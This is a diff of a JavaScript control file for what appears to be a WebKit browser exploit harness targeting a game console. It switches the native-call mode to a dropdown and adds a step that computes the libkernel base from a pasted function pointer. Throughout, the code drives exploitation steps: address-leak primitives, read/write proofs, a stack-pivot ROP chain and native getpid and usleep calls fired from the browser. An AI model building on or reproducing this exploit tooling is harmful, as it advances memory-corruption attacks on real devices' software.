@@ -58,11 +58,24 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832m";
-/** native=usleep | smoke | getpid | off — fire at PRIMITIVE-OK when lk in session (Okage paste OK) */
-const NATIVE_MODE = (params.get("native") || "usleep").toLowerCase();
-const NATIVE_FIRE_USLEEP = NATIVE_MODE === "usleep";
-const NATIVE_FIRE_OFF = NATIVE_MODE === "off" || params.get("fire") === "0";
+const BUILD_ID = "rw-20250832n";
+const SS_NATIVE_MODE = "wk-native-mode";
+/** Auto-fire at PRIMITIVE-OK — set via #native-mode dropdown (not URL). */
+function getNativeMode() {
+    if (nativeModeSel && nativeModeSel.value)
+        return String(nativeModeSel.value).toLowerCase();
+    try {
+        const s = sessionStorage.getItem(SS_NATIVE_MODE);
+        if (s) return s.toLowerCase();
+    } catch (_) { }
+    return "usleep";
+}
+function setNativeMode(mode) {
+    mode = String(mode || "usleep").toLowerCase();
+    if (nativeModeSel) nativeModeSel.value = mode;
+    try { sessionStorage.setItem(SS_NATIVE_MODE, mode); } catch (_) { }
+}
+function nativeFireOff() { return getNativeMode() === "off"; }
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
@@ -129,7 +142,7 @@ const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER
 let raceMode = false;
 const raceBuf = [];
 
-let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
+let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
 let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
@@ -230,15 +243,19 @@ function setUi() {
     }
     if (btnNative) {
         btnNative.disabled = busy || !ready || !nativeAllowed;
+        const nm = getNativeMode();
         if (nativeStaged) {
-            btnNative.textContent = NATIVE_MODE === "smoke" ? "Fire smoke" : (NATIVE_FIRE_USLEEP ? "Fire usleep" : "Fire getpid");
+            btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
             btnNative.title = "prefer reload+Start for fresh heap";
         } else {
-            btnNative.textContent = NATIVE_MODE === "smoke" ? "Fire smoke" : (NATIVE_FIRE_USLEEP ? "Fire usleep" : "Fire getpid");
+            btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
             btnNative.title = "Okage: Accept lk → reload → Start auto-fires";
         }
     }
-    if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
+    if (btnLoadCal) {
+        btnLoadCal.disabled = busy;
+        btnLoadCal.textContent = "Calc lk";
+    }
     if (btnForceLk) {
         btnForceLk.disabled = busy;
         btnForceLk.textContent = "Accept lk";
@@ -599,10 +616,15 @@ const MANUAL_TESTS = [
 ];
 
 function runManualTest(testId) {
-    const preStartOk = testId === "verify-lk" || testId === "force-lk" || testId === "paste-lk";
+    const preStartOk = testId === "verify-lk" || testId === "force-lk" || testId === "paste-lk"
+        || testId === "try-cal-ptrs";
     if (preStartOk) {
         if (testId === "verify-lk") {
             runVerifyLk();
+            return;
+        }
+        if (testId === "try-cal-ptrs") {
+            calcLkFromHex();
             return;
         }
         if (testId === "force-lk" || testId === "paste-lk") {
@@ -2021,39 +2043,61 @@ async function runShowLkHints() {
 }
 
 let leakScanState = null;
+let calLkHits = [];
+let calLkHitIdx = 0;
 
-function runTryCalPtrs() {
-    if (!ready || busy) return;
+/** Calc lk from hex box — Okage base or fn ptr − Suchi RVA. No cal session needed. */
+function calcLkFromHex() {
     const off = loadEffectiveOff();
-    calLkCands = buildCalLkCandidates(null, off, null);
-    if (!calLkCands.length) {
-        mark("LK-CAL-MISS", "no cal ext ptrs — run cal 2e vtable first, or paste ext ptr hex");
-        mark("LK-HINT", "Calc: lk = fnPtr − Suchi RVA (alignment filter, 0 reads)");
-        state("no cal ptrs", "bad");
+    let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
+    if (!hex) {
+        mark("LK-SKIP", "paste Okage base (83f33ac30) or libkernel fn ptr in hex box");
+        state("paste hex first", "bad");
         renderOut();
         return;
     }
-    if (calPtrIdx >= calLkCands.length) {
-        calPtrIdx = 0;
-        mark("LK-CAL-DONE", "cycle reset — tried all " + calLkCands.length + " bases");
+    const ptr = parseAddr(hex);
+    if (!ptr) {
+        mark("LK-SKIP", "bad hex");
+        state("bad hex", "bad");
         renderOut();
         return;
     }
-    const c = calLkCands[calPtrIdx++];
-    if (lines.length > 32) lines.splice(0, lines.length - 32);
-    if (addrIn && c.base) addrIn.value = String(c.base);
-    mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
-        + " " + c.label + " code=" + c.code + " → base=" + c.base + " (" + c.note + ")");
-    mark("LK-HINT", "Accept lk or Force lk (both 0 read) → Arm → Fire");
-    if (outEl) {
-        outEl.textContent = lines.join("\n");
-        outEl.scrollTop = outEl.scrollHeight;
+    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "calc-base" });
+    if (asBase.ok) {
+        if (addrIn) addrIn.value = String(ptr);
+        mark("LK-CAL", "already lk base " + ptr + " (…c30) — tap Accept lk");
+        state("base OK — Accept lk", "ok");
+        renderOut();
+        return;
     }
-    state("calc " + calPtrIdx + "/" + calLkCands.length + " — Force lk or Verify", "warn");
+    const hits = calcLkFromFnPtrZeroRead(ptr, off);
+    if (!hits.length) {
+        mark("LK-CAL-MISS", hex + " — not …c30 base and no Suchi RVA match");
+        mark("LK-HINT", "Okage: paste full base ending c30 (e.g. 83f33ac30)");
+        state("calc miss", "bad");
+        renderOut();
+        return;
+    }
+    if (calLkHits.length !== hits.length || String(calLkHits[0] && calLkHits[0].lk) !== String(hits[0].lk))
+        calLkHitIdx = 0;
+    calLkHits = hits;
+    const h = hits[calLkHitIdx % hits.length];
+    calLkHitIdx++;
+    if (addrIn) addrIn.value = String(h.lk);
+    mark("LK-CAL", calLkHitIdx + "/" + hits.length + " fn−" + h.key
+        + "+0x" + h.rva.toString(16) + " → " + h.lk + " (0 read)");
+    mark("LK-HINT", "Accept lk → reload → Start");
+    state("calc OK — Accept lk", "ok");
+    renderOut();
     try {
-        crashLog.append("LK-CAL " + c.label + " base=" + c.base + " " + c.note, "LK-CAL");
+        crashLog.append("LK-CAL " + h.lk + " fn−" + h.key, "LK-CAL");
         crashLog.flushSync();
     } catch (_) { }
+}
+
+function runTryCalPtrs() {
+    calcLkFromHex();
 }
 
 function acceptLkFromHex(hexOverride) {
@@ -3105,16 +3149,17 @@ function pinNativeRetain() {
 
 /** Fire at PRIMITIVE-OK — chain_poops never returns to UI before first expm1. */
 function tryNativeFireAtStart(p, off) {
-    if (NATIVE_FIRE_OFF || !nativePrep) return;
+    if (nativeFireOff() || !nativePrep) return;
+    const nm = getNativeMode();
     nativeQuiet = true;
     lkQuiet = true;
     pinNativeRetain();
     try {
-        if (NATIVE_MODE === "smoke") {
+        if (nm === "smoke") {
             mark("NATIVE-FIRE", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
             renderOut();
             firePivotSmoke(p, nativePrep);
-            mark("NATIVE-OK", "pivot smoke @ Start (webkit only, no lk) build=" + BUILD_ID);
+            mark("NATIVE-OK", "pivot smoke @ Start (webkit only) build=" + BUILD_ID);
             state("pivot smoke OK — chain works", "ok");
             return;
         }
@@ -3128,11 +3173,11 @@ function tryNativeFireAtStart(p, off) {
             })()
             || (addrIn && addrIn.value ? parseAddr(addrIn.value.replace(/^0x/i, "")) : null);
         if (!lk) {
-            mark("NATIVE-SKIP", "paste Okage lk → Accept lk → reload → Start (fires @ PRIMITIVE-OK)");
+            mark("NATIVE-SKIP", "paste Okage lk → Accept lk → reload → Start");
             return;
         }
         if (addrIn) addrIn.value = String(lk);
-        if (NATIVE_MODE === "getpid") {
+        if (nm === "getpid") {
             mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk);
             renderOut();
             stageGetpid(p, nativePrep, lk, off);
@@ -3142,16 +3187,16 @@ function tryNativeFireAtStart(p, off) {
             mark("NATIVE-FIRE", "usleep @ PRIMITIVE-OK lk=" + lk);
             renderOut();
             fireUsleep(p, nativePrep, lk, off, 1000);
-            mark("NATIVE-OK", "usleep @ Start lk=" + lk + " (Okage/same-boot) build=" + BUILD_ID);
+            mark("NATIVE-OK", "usleep @ Start lk=" + lk + " build=" + BUILD_ID);
         }
         state("native OK @ Start", "ok");
         saveLibkernelSession(lk, null, { forced: true });
     } catch (err) {
         mark("NATIVE-FAIL", "Start fire: " + (err.message || String(err)) + " build=" + BUILD_ID);
-        if (NATIVE_MODE === "smoke")
+        if (nm === "smoke")
             mark("NATIVE-HINT", "smoke failed = pivot/gadget issue (not lk)");
         else
-            mark("NATIVE-HINT", "wrong lk for WebKit? need same-boot Okage or cal ext ptr");
+            mark("NATIVE-HINT", "wrong lk for WebKit? try same-boot Okage");
         state("native fire failed @ Start", "bad");
     } finally {
         nativeQuiet = false;
@@ -3219,8 +3264,9 @@ function runFireGetpid() {
     if (busy || !ready || !window.p || !nativeAllowed) return;
     const p = window.p;
     const off = loadEffectiveOff();
+    const nm = getNativeMode();
     const lk = lkFromUi();
-    if (!lk) {
+    if (nm !== "smoke" && !lk) {
         mark("NATIVE-SKIP", "Accept lk first");
         renderOut();
         return;
@@ -3242,11 +3288,11 @@ function runFireGetpid() {
 
     let errMsg = null;
     let pid = -1;
-    const kind = NATIVE_MODE === "smoke" ? "smoke" : (NATIVE_FIRE_USLEEP ? "usleep+13b20" : "getpid");
+    const kind = nm === "smoke" ? "smoke" : (nm === "usleep" ? "usleep+13b20" : "getpid");
     try {
-        if (NATIVE_MODE === "smoke") {
+        if (nm === "smoke") {
             firePivotSmoke(p, nativePrep);
-        } else if (NATIVE_FIRE_USLEEP) {
+        } else if (nm === "usleep") {
             pid = fireUsleep(p, nativePrep, lk, off, 1000);
         } else {
             stageGetpid(p, nativePrep, lk, off);
@@ -3507,13 +3553,13 @@ async function runStart() {
         const off = loadEffectiveOff();
         try {
             ensureNativePrep(p, off);
-            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + NATIVE_MODE);
+            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + getNativeMode());
             tryNativeFireAtStart(p, off);
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Okage: hex 83f33ac30 → Accept lk → reload → Start. Bisect: ?native=smoke");
+        mark("HINT", "Okage: paste 83f33ac30 → Accept lk → reload → Start");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
@@ -3558,6 +3604,7 @@ function init() {
     hexEl = $("hex");
     pickPtr = $("pick-ptr");
     addrIn = $("addr-in");
+    nativeModeSel = $("native-mode");
     btnStart = $("btn-start");
     btnSaveBases = $("btn-save-bases");
     btnRwProof = $("btn-rw-proof");
@@ -3606,6 +3653,19 @@ function init() {
         if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
         peekAt(a);
     });
+
+    if (nativeModeSel) {
+        try {
+            const saved = sessionStorage.getItem(SS_NATIVE_MODE);
+            if (saved) nativeModeSel.value = saved;
+        } catch (_) { }
+        nativeModeSel.addEventListener("change", function () {
+            setNativeMode(nativeModeSel.value);
+            mark("NATIVE-MODE", getNativeMode());
+            setUi();
+            renderOut();
+        });
+    }
 
     if (pickPtr) {
         pickPtr.addEventListener("change", function () {
@@ -3656,7 +3716,7 @@ function init() {
     else crashLog.restoreInto(lines);
 
     crashLog.startAutoFlush();
-    mark("BOOT", "build=" + BUILD_ID + " native=" + NATIVE_MODE + " — logs persist across reload/crash");
+    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
     mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
     replayHuntTrace();
@@ -3669,7 +3729,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("paste Okage lk → Accept lk → reload → Start (?native=smoke to bisect)", "");
+    state("paste Okage lk → Accept lk → reload → Start", "");
 }
 
 function bootUi() {
